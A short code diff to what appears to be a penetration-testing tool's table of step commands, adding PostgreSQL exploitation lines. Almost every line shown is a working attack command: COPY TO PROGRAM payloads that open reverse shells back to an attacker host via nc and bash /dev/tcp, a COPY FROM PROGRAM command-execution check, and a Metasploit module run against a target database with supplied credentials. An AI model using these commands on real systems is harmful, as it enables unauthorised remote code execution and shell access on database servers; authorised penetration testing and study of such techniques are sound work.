@@ -4741,6 +4741,9 @@ _STEP_COMMANDS = {
         ],
         4: [
             "PGPASSWORD=<PASS> psql -h <RHOST> -U <USER> -c \"COPY (SELECT '') TO PROGRAM 'nc <LHOST> <LPORT> -e /bin/sh';\"",
+            "PGPASSWORD=<PASS> psql -h <RHOST> -U <USER> -c \"COPY (SELECT '') TO PROGRAM 'bash -c \\\"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\\\"';\"",
+            "PGPASSWORD=<PASS> psql -h <RHOST> -U <USER> -c \"DROP TABLE IF EXISTS x; CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; SELECT * FROM x;\"",
+            "msfconsole -q -x 'use exploit/multi/postgres/postgres_copy_from_program_cmd_exec; set RHOSTS <RHOST>; set USERNAME <USER>; set PASSWORD <PASS>; run'",
         ],
         5: [
             "# HackTricks PostgreSQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql",
